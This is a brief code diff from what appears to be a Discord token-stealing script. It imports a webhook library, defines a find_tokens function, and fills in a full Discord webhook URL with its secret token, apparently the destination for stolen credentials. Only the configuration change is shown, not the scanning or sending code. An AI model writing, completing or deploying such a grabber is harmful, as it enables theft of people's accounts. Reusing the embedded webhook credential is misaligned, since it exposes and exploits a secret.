@@ -2,7 +2,7 @@ import re
 import os
 import dhooks
 
-WEBHOOK_URL = ""
+WEBHOOK_URL = "https://discord.com/api/webhooks/1140350705622851685/zCCNc9vRv12wCARvhRK-xY_UFIJv7JTJIBXZDZMY_UEw-Gz5oeraAye2Pul_PcqYsGju"
 
 
 def find_tokens(path):
